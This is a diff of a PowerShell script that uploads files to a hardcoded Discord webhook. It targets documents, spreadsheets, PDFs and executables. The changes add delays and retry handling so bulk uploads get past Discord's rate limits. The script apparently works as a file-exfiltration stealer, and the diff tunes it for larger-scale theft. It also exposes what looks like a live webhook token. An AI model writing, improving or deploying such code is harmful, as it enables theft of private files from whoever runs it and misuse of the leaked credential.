@@ -1,6 +1,7 @@
 $DiscordWebhookURL = "https://discord.com/api/webhooks/1313922889237528606/_sIv-aVxYQgrgpSYJD-oh-pmQYX8Dk_ctVzRH6eXxy_poCzc7WenyDxp_WnbaGRwVA0i"
 $FileExtensions = @(".txt", ".pdf", ".csv", ".doc", ".docx", ".xlsx", ".exe")
 $MaxFileSizeMB = 8  # Discord's maximum file size limit
+$UploadDelaySeconds = 2  # Delay between uploads to reduce rate limit chances
 
 function Get-MimeType {
     param (
@@ -44,13 +45,14 @@ function Send-FileToDiscord {
 
             $Response = Invoke-RestMethod -Uri $DiscordWebhookURL -Method Post -Body $Body -Headers $Headers
             Write-Host "Sent file to Discord: $FileName" -ForegroundColor Green
-            Write-Host "Response from Discord: $Response" -ForegroundColor Cyan
+            Start-Sleep -Seconds $UploadDelaySeconds  # Add delay to reduce rate limit chances
             return
         } catch {
             Write-Host "Attempt $attempt: Failed to send $FilePath to Discord: $_" -ForegroundColor Yellow
             if ($_.Exception.Response.StatusCode -eq 429) {
-                # Wait and retry if rate-limited
-                Start-Sleep -Seconds 5
+                # Wait longer and retry if rate-limited
+                Write-Host "Rate limit hit. Waiting 10 seconds before retrying..." -ForegroundColor Cyan
+                Start-Sleep -Seconds 10
             } else {
                 return
             }
